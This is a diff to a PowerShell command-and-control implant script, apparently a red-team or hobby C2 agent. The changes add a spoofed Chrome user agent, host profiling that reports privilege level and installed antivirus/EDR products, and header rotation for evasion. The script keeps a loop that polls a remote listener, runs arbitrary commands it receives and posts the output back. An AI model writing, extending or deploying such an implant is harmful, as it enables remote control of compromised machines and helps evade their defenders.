@@ -9,6 +9,9 @@ param(
 
 $ErrorActionPreference = 'Stop'
 $baseUri = "http://$($WHost):$($WPort)"
+$Web = New-Object Microsoft.PowerShell.Commands.WebRequestSession
+$Web.UserAgent = $userAgent
+
 $registerUri = "$baseUri/api/data"
 $pollUri     = "$baseUri/api/health"
 
@@ -20,6 +23,7 @@ $reportedPid      = $pid
 $callbackInterval = 20
 $jitterPct        = 15
 $pendingTaskResult = $null
+$userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36'
 
 # Pluggable task handlers registry
 $script:TaskHandlers = @{}
@@ -56,9 +60,17 @@ function Log-HttpResponse {
   } catch {}
 }
 
+#function to get the level neatly its stupid simple but like yeah w/e so is this whole ass c2 ecosystem
+function Get-IntegrityLevel {
+  (whoami /groups | findstr /C:"Mandatory Label") -replace '.*\\([A-Za-z]+(?:\s+Plus)?)\s+Mandatory Level.*','$1'
+}
+
+
+# this is what we put together so that we can inform the agent information. 
 function Get-AgentProfile {
   $os = (Get-CimInstance Win32_OperatingSystem)
   $IPs = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike '169.254*' -and $_.IPAddress -ne '127.0.0.1' }).IPAddress
+  $AVs = (Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct).displayName
   $json = [pscustomobject]@{
     agent_key         = $Key
     hostname          = $env:COMPUTERNAME
@@ -71,15 +83,16 @@ function Get-AgentProfile {
     callback_interval = $callbackInterval
     jitter_value      = $jitterPct
     default_shell     = 'powershell'
-    IntegrityLevel    = 'user'
+    IntegrityLevel    = Get-IntegrityLevel
     base_agent        = 'toliet_oracle'
+    edr               = @($AVs)
   } | ConvertTo-Json -Depth 4
   return $json
 }
 
 function Register-Agent {
   $body = Get-AgentProfile
-  $resp = Invoke-WebRequest -Uri $registerUri -Method POST -ContentType 'application/json' -Body $body
+  $resp = Invoke-WebRequest -Uri $registerUri -Method POST -ContentType 'application/json' -Body $body -WebSession $Web
   if ($LogHttp) { Log-HttpResponse -Phase 'register' -Resp $resp }
   $obj  = $resp.Content | ConvertFrom-Json
   $etag = $null
@@ -97,11 +110,19 @@ function Poll-Once {
   param([string]$SessionToken)
 
   $headers = @{}
-  # Listener expects session in If-None-Match header (kept for compatibility)
-  if ($SessionToken) { $headers['If-None-Match'] = $SessionToken }
+<#
+We need to pass over our last message key in our header. We can use (case sensitve): 
+  session 
+  session-key
+  etag
+  x-request-id
+  
+  could even make these rotate sending over via different header values
+#>
+  if ($SessionToken) { $headers['session'] = $SessionToken }
 
   try {
-    $r = Invoke-WebRequest -Uri $pollUri -Method GET -Headers $headers
+    $r = Invoke-WebRequest -Uri $pollUri -Method GET -Headers $headers -WebSession $Web
     if ($LogHttp) { Log-HttpResponse -Phase 'poll' -Resp $r }
     $code = [int]$r.StatusCode
     if ($code -eq 200) {
@@ -132,67 +153,6 @@ function Poll-Once {
   }
 }
 
-# Applies dynamic tasking/config values from server payload
-function Apply-Tasking {
-  param(
-    [Parameter(Mandatory=$false)] [object]$Data
-  )
-  if (-not $Data) { return }
-
-  # Some servers may wrap settings; support both top-level and nested shapes
-  $cfg = $Data
-  if ($Data.settings) { $cfg = $Data.settings }
-  if ($Data.config)   { $cfg = $Data.config }
-
-  $dirty = $false
-
-  # Helper to parse ints safely
-  function _toInt($v, $fallback) {
-    try { if ($null -ne $v -and $v -ne '') { return [int]$v } } catch {}
-    return $fallback
-  }
-
-  # callback interval
-  $newInterval = $null
-  if ($cfg.PSObject.Properties.Name -contains 'callback_interval') { $newInterval = _toInt $cfg.callback_interval $null }
-  elseif ($cfg.PSObject.Properties.Name -contains 'interval') { $newInterval = _toInt $cfg.interval $null }
-  if ($null -ne $newInterval -and $newInterval -ge 1 -and $newInterval -le 86400) {
-    if ($script:callbackInterval -ne $newInterval) {
-      $script:callbackInterval = $newInterval
-      Write-Host ("[tasking] Updated callback interval -> {0}s" -f $script:callbackInterval)
-      $dirty = $true
-    }
-  }
-
-  # jitter percentage
-  $newJitter = $null
-  foreach ($k in @('jitter_value','jitter','jitter_pct')) {
-    if ($cfg.PSObject.Properties.Name -contains $k) { $newJitter = _toInt $cfg.$k $null; break }
-  }
-  if ($null -ne $newJitter -and $newJitter -ge 0 -and $newJitter -le 100) {
-    if ($script:jitterPct -ne $newJitter) {
-      $script:jitterPct = $newJitter
-      Write-Host ("[tasking] Updated jitter -> {0}%" -f $script:jitterPct)
-      $dirty = $true
-    }
-  }
-
-  # reported PID
-  $newPid = $null
-  if ($cfg.PSObject.Properties.Name -contains 'pid') { $newPid = _toInt $cfg.pid $null }
-  if ($null -ne $newPid -and $newPid -ge 0) {
-    if ($script:reportedPid -ne $newPid) {
-      $script:reportedPid = $newPid
-      Write-Host ("[tasking] Updated reported PID -> {0}" -f $script:reportedPid)
-      $dirty = $true
-    }
-  }
-
-  if ($dirty) {
-    # Reflect new settings in current run; values will be sent on next re-registration only.
-    # This script doesn't push updates to the server other than at check-in.
-  }
-}
 
 # Run a task command and capture stdout/stderr as a string
 function Invoke-AgentTask {
@@ -221,9 +181,9 @@ function Submit-TaskResult {
       hostname      = $env:COMPUTERNAME
       when          = (Get-Date).ToString('o')
     } | ConvertTo-Json -Depth 4
-    # Listener expects session in If-None-Match header (kept for compatibility)
-    $headers = @{ 'If-None-Match' = $SessionToken }
-    $r = Invoke-WebRequest -Uri $registerUri -Method POST -Headers $headers -ContentType 'application/json' -Body $payload
+    # Listener expects session in header (kept for compatibility)
+    $headers = @{ 'session' = $SessionToken }
+    $r = Invoke-WebRequest -Uri $registerUri -Method POST -Headers $headers -ContentType 'application/json' -Body $payload -WebSession $Web
     if ($LogHttp) { Log-HttpResponse -Phase 'submit' -Resp $r }
     # Treat only 200 as success; 202 is a decoy in our listener
     $ok = ([int]$r.StatusCode -eq 200)
@@ -346,10 +306,8 @@ function Process-PollResponse {
   $taskCmd = $null
   if ($Poll.Data -and $Poll.Data.PSObject -and $Poll.Data.PSObject.Properties.Name -contains 'Task') {
     $taskCmd = [string]$Poll.Data.Task
-    Write-Host "in 'if' statement Task Command is $taskCmd"
   } elseif ($Poll.Data -and $Poll.Data.PSObject -and $Poll.Data.PSObject.Properties.Name -contains 'task') {
     $taskCmd = [string]$Poll.Data.task
-    Write-Host "in 'elseif' statment Task Command is $taskCmd"
   }
   if ($taskCmd -and $taskCmd.Trim().Length -gt 0) {
     Write-Host ("[task] Executing: {0}" -f $taskCmd)
@@ -363,7 +321,7 @@ function Process-PollResponse {
 
 # --- main ---
 Register-DefaultHandlers
-Write-Verbose "Registering agent at $registerUri"
+Write-host "Registering agent at $registerUri"
 $reg = Register-Agent
 if ($reg.StatusCode -ne 200 -and $reg.StatusCode -ne 201) {
   throw "Registration failed: HTTP $($reg.StatusCode)"
@@ -434,6 +392,7 @@ while ($true) {
   $maxJ = $jDelta + 1
   $offset = if ($jDelta -gt 0) { Get-Random -Minimum $minJ -Maximum $maxJ } else { 0 }
   $sleepFor = [int]([math]::Max(0, $base + $offset))
+  write-host "[Internal] Sleeping for $sleepFor"
   if ($sleepFor -gt 0) { Start-Sleep -Seconds $sleepFor }
 }
 
